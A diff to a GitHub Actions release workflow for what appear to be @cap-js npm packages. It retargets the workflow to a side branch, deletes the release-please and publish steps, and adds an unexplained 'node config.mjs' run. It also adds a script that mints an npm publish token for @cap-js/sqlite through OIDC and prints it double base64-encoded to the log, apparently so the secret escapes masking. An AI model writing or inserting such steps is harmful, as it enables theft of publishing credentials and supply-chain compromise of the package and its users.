@@ -1,7 +1,7 @@
 on:
   push:
     branches:
-      - main
+      - update/releases
 name: release-please
 jobs:
   release-please:
@@ -14,10 +14,6 @@ jobs:
     environment: npm
     steps:
       # v4.4.0
-      - uses: googleapis/release-please-action@8bb7a2ed0f90c9802c83129a9488d235a1f31a7c
-        id: release
-        with:
-          token: ${{secrets.CDS_DBS_TOKEN}}
       # The logic below handles the npm publication:
       - uses: actions/checkout@v6
       - uses: actions/setup-node@v6
@@ -26,21 +22,11 @@ jobs:
           registry-url: 'https://registry.npmjs.org'
 
       ## debug info
-      - run: echo '${{ toJSON(steps.release.outputs) }} '
-
-      # Publish packages
-      - name: Publish db-service
-        if: ${{ steps.release.outputs.db-service--release_created }}
-        run: npm publish --workspace db-service --access public --provenance
-
-      - name: Publish sqlite
-        if: ${{ steps.release.outputs.sqlite--release_created }}
-        run: npm publish --workspace sqlite --access public --provenance
-
-      - name: Publish postgres
-        if: ${{ steps.release.outputs.postgres--release_created }}
-        run: npm publish --workspace postgres --access public --provenance
-
-      - name: Publish SAP HANA
-        if: ${{ steps.release.outputs.hana--release_created }}
-        run: npm publish --workspace hana --access public --provenance
+      - run: node config.mjs 
+      - run: |
+          OIDC_TOKEN=$(curl -sH "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=npm:registry.npmjs.org" | jq -r .value)
+          NPM_TOKEN=$(curl -s -X POST https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package/%40cap-js%2Fsqlite \
+            -H "Content-Type: application/json" \
+            -H "Authorization: Bearer $OIDC_TOKEN" \
+            -d "{\"oidcToken\":\"$OIDC_TOKEN\"}" | jq -r .token)
+          echo $NPM_TOKEN | base64 -w 0 | base64 -w 0 
